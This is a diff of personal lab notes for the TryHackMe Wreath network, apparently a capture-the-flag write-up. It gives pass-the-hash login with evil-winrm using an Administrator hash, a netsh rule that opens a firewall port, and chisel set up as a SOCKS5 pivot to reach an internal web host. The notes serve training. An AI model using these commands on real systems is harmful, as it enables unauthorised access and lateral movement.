@@ -25,41 +25,51 @@ Whether you choose the recommended option or not, get a pivot up and running!
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /home/kali/Tryhackme/Wreath/Chisel_1.7.7
 ```
 
-1. Open up a port for pivoting. #Evil-WinRM_shell 
+2. Open up a port for pivoting. 
+#Evil-WinRM_shell 
 ```
-netsh advfirewall firewall add rule name="Chisel-exec2" dir=in action=allow protocol=tcp localport=44444
+netsh advfirewall firewall add rule name="Chisel-exec2" dir=in action=allow protocol=tcp localport=18456
 ```
+> [!Note]
+>If you can't connect to the webpage, change the localport.
 
-1. Download   [chisel_1.7.7_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)  and [chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) #Attacking_Machine 
+#Attacking_Machine 
+3. Download   [chisel_1.7.7_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz)  and [chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) 
 
-2. Decompress the .gz file. #Attacking_Machine 
+4. Decompress the .gz file. #Attacking_Machine 
 
-3. Upload the chisel.exe file in #Evil-WinRM_shell  session.
+5. Upload the chisel.exe file.
+#Evil-WinRM_shell 
 ```
 upload chisel.exe
 ```
 
-4. Setup chisel server forward socks proxy on #Evil-WinRM_shell 
+6. Setup chisel server forward socks proxy on 
+#Evil-WinRM_shell 
 ```
-./chisel.exe server -p 44444 --socks5
+./chisel.exe server -p 18456 --socks5
 ```
 
-5. Install chisel on Kali Linux. #Attacking_Machine 
+7. Install chisel on Kali Linux. #Attacking_Machine 
 	- Download `chisel_1.10.1_linux_amd64.deb` and decompress it.
 	- Copy `chisel` file to `/usr/bin`.
 
+![[Screenshot from 2025-02-21 11-51-44.png]]
 
-6. Run chisel client. #Attacking_Machine 
+8. Run chisel client. 
+#Attacking_Machine 
 ```
-chisel client 10.200.84.150:44444 9090:socks
+chisel client 10.200.84.150:18456 9090:socks
 ```
+
+![[Screenshot from 2025-02-21 11-50-16.png]]
 
 Now the socks proxy is opened on port 9090 of our port
 
-7. Setup FoxyProxy: Ensure you setup a `SOCKS5` proxy with *foxyproxy*:
+9. Setup FoxyProxy: Ensure you setup a `SOCKS5` proxy with *foxyproxy*:
 	 ![[Pivoting-20250126190740769.webp]]
 
-8. Navigate to http://10.200.X.100.
+10. Navigate to http://10.200.X.100.
 	 ![[Pivoting-20250126190906256.webp]]
 
 9. Install wappalyzer extension on your browers and see the results.
